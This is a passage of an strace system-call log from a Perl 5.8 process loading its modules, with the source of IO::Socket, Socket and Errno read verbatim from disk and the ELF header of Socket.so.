waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
5498  07:09:19.819616 _llseek(10, 3425, [3425], SEEK_SET) = 0
5498  07:09:19.819634 _llseek(10, 0, [3425], SEEK_CUR) = 0
5498  07:09:19.819645 close(10)         = 0
5498  07:09:19.819668 stat64("/etc/perl/IO/Socket.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819682 stat64("/etc/perl/IO/Socket.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819696 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819713 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819727 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819740 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819754 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819766 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819779 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819791 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819804 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.819816 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
5498  07:09:19.819837 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.819852 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.819863 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.819880 read(10, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
5498  07:09:19.820253 stat64("/etc/perl/Socket.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820269 stat64("/etc/perl/Socket.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820282 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820295 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820309 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820321 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820335 stat64("/usr/lib/perl5/Socket.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820347 stat64("/usr/lib/perl5/Socket.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820360 stat64("/usr/share/perl5/Socket.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820372 stat64("/usr/share/perl5/Socket.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820385 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.820397 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
5498  07:09:19.820417 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.820442 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.820482 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.820518 read(11, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
5498  07:09:19.820935 brk(0x8239000)    = 0x8239000
5498  07:09:19.821180 read(11, "", 4096) = 0
5498  07:09:19.821195 close(11)         = 0
5498  07:09:19.821279 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5498  07:09:19.821304 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5498  07:09:19.821330 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 11
5498  07:09:19.821344 read(11, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
5498  07:09:19.821476 fstat64(11, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5498  07:09:19.821532 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 11, 0) = 0xb7d82000
5498  07:09:19.821545 mmap2(0xb7d87000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 11, 0x4) = 0xb7d87000
5498  07:09:19.821560 close(11)         = 0
5498  07:09:19.822141 brk(0x825a000)    = 0x825a000
5498  07:09:19.830491 stat64("/etc/perl/Errno.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830541 stat64("/etc/perl/Errno.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830555 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830568 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830582 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830595 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830609 stat64("/usr/lib/perl5/Errno.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830621 stat64("/usr/lib/perl5/Errno.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830634 stat64("/usr/share/perl5/Errno.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830674 stat64("/usr/share/perl5/Errno.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830688 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.830700 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
5498  07:09:19.830721 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.830784 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.830812 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.830834 read(11, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
5498  07:09:19.831688 read(11, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
5498  07:09:19.832168 _llseek(11, 5966, [5966], SEEK_SET) = 0
5498  07:09:19.832184 _llseek(11, 0, [5966], SEEK_CUR) = 0
5498  07:09:19.832195 close(11)         = 0
5498  07:09:19.832699 brk(0x827b000)    = 0x827b000
